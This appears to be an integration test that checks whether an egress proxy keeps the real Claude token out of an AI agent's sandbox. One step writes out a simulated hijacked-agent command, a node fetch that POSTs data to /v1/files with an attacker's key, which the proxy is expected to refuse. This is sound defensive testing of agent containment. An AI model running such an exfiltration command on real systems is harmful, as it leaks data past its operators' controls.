import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { createServer, type Server } from 'node:https';
import type { AddressInfo, LookupFunction } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { SANDBOX_CLAUDE_TOKEN } from '../../src/adapters/runner/claude-code.js';
import type { Sandbox } from '../../src/adapters/sandbox/types.js';
import { CLAUDE_RUN_ENV } from '../../src/core/orchestrator.js';
import { LeafIssuer, loadOrCreateCa } from '../../src/network/ca.js';
import { EgressProxy, type EgressEntry } from '../../src/network/proxy.js';
import { cli, enabled, useSandboxes } from './helpers.js';

/**
 * ORC-337: the real `claude -p` of the runner image, in a sandbox holding a placeholder for its token, through the
 * real egress proxy, to a stand-in for api.anthropic.com. It runs as before, and the API sees the factory's token
 * alone. No credential needed: run it on the runner image (FACTORY_RUNNER_IMAGE); without `claude` in the image, it
 * skips itself. Linux only, the proxy in this process as in the daemon (network.test.ts tells why).
 */
const FACTORY_TOKEN = 'sk-ant-oat01-the-factory-token-iso';
const runnable = enabled && process.platform === 'linux';

/** One SSE event of the Messages API. */
const sse = (type: string, data: object) => `event: ${type}\ndata: ${JSON.stringify({ type, ...data })}\n\n`;
const message = { id: 'msg_iso', type: 'message', role: 'assistant', model: 'claude-haiku-4-5', content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 1, output_tokens: 1 } };
const REPLY =
  sse('message_start', { message }) +
  sse('content_block_start', { index: 0, content_block: { type: 'text', text: '' } }) +
  sse('content_block_delta', { index: 0, delta: { type: 'text_delta', text: 'PONG-FROM-THE-STAND-IN' } }) +
  sse('content_block_stop', { index: 0 }) +
  sse('message_delta', { delta: { stop_reason: 'end_turn', stop_sequence: null }, usage: { output_tokens: 1 } }) +
  sse('message_stop', {});

describe.skipIf(!runnable)(`the Claude token stays out of the sandbox (${cli}, ORC-337)`, () => {
  const dir = mkdtempSync(join(tmpdir(), 'factory-claude-token-'));
  /** What the stand-in API got: method, path and credentials. */
  const seen: { method: string; url: string; authorization?: string; apiKey?: string }[] = [];
  let api: Server;
  let proxy: EgressProxy;
  let sbx: Sandbox;
  let hasClaude = false;
  const { provider, request, sh } = useSandboxes('claude-token', {
    egress: {
      open: (runId, policy) => proxy.open(runId, policy),
      close: (runId) => proxy.close(runId),
      isOpen: (runId) => proxy.isOpen(runId),
      get caCertPath() {
        return proxy.caCertPath;
      },
    },
  });

  const runId = request().runId;

  beforeAll(async () => {
    const ca = await loadOrCreateCa(join(dir, 'api-ca'));
    const issuer = await LeafIssuer.create(ca);
    api = createServer({ SNICallback: (name, cb) => cb(null, issuer.context(name)) }, (req, res) => {
      seen.push({ method: req.method!, url: req.url!, authorization: req.headers.authorization, apiKey: req.headers['x-api-key'] as string | undefined });
      req.resume();
      req.on('end', () => {
        if (req.url?.startsWith('/v1/messages')) return void res.writeHead(200, { 'content-type': 'text/event-stream' }).end(REPLY);
        res.writeHead(404, { 'content-type': 'application/json' }).end('{"type":"error","error":{"type":"not_found_error","message":"stand-in"}}');
      });
    });
    await new Promise<void>((ok) => api.listen(0, '127.0.0.1', ok));
    const toApi = ((_h: string, o: { all?: boolean }, cb: (e: null, a: unknown, f?: number) => void) =>
      o.all ? cb(null, [{ address: '127.0.0.1', family: 4 }]) : cb(null, '127.0.0.1', 4)) as unknown as LookupFunction;
    proxy = new EgressProxy({ dir: join(dir, 'network'), caDir: join(dir, 'ca'), claudeToken: () => FACTORY_TOKEN, upstream: { ca: ca.certPem, lookup: toApi, port: (api.address() as AddressInfo).port } });
    sbx = await provider.create(request({ runId, network: 'claude-api' }));
    hasClaude = (await sh(sbx.id, 'command -v claude')).code === 0;
  }, 300_000);

  afterAll(async () => {
    await proxy?.closeAll();
    await new Promise((ok) => (api ? api.close(ok) : ok(undefined)));
    rmSync(dir, { recursive: true, force: true });
  }, 120_000);

  it('claude -p answers through the proxy with a placeholder token; the API gets the factory token alone; /v1/files is refused', async ({ skip }) => {
    if (!hasClaude) skip();
    const env = { ...CLAUDE_RUN_ENV, CLAUDE_CONFIG_DIR: '/tmp/claude-config', CLAUDE_CODE_OAUTH_TOKEN: SANDBOX_CLAUDE_TOKEN };
    const r = await sh(sbx.id, `env ${Object.entries(env).map(([k, v]) => `${k}=${v}`).join(' ')} claude -p 'say pong' --output-format stream-json --verbose --model haiku --max-turns 1 --tools ''`);
    const result = r.stdout.split('\n').filter((l) => l.startsWith('{')).map((l) => JSON.parse(l) as Record<string, unknown>).find((e) => e['type'] === 'result');
    expect(result, r.stderr).toMatchObject({ is_error: false, result: 'PONG-FROM-THE-STAND-IN' });
    expect(seen.some((s) => s.method === 'POST' && s.url.startsWith('/v1/messages'))).toBe(true);
    for (const s of seen) expect(s).toMatchObject({ authorization: `Bearer ${FACTORY_TOKEN}`, apiKey: undefined });

    // What a hijacked agent would do: its own key, to a path Claude Code never calls.
    const files = `node -e "fetch('https://api.anthropic.com/v1/files',{method:'POST',headers:{'x-api-key':'sk-ant-api03-attacker'},body:'x'}).then(r=>console.log(r.status),e=>{console.log('ERR',e.cause?.code??e.message);process.exit(3)})"`;
    expect((await sh(sbx.id, files)).stdout).toBe('403');
    const journal = readFileSync(proxy.journalPath(runId), 'utf8').trim().split('\n').map((l) => JSON.parse(l) as EgressEntry);
    expect(journal).toContainEqual(expect.objectContaining({ method: 'POST', host: 'api.anthropic.com', path: '/v1/files', ok: false }));
    expect(seen.map((s) => s.url)).not.toContain('/v1/files');
  }, 240_000);
});
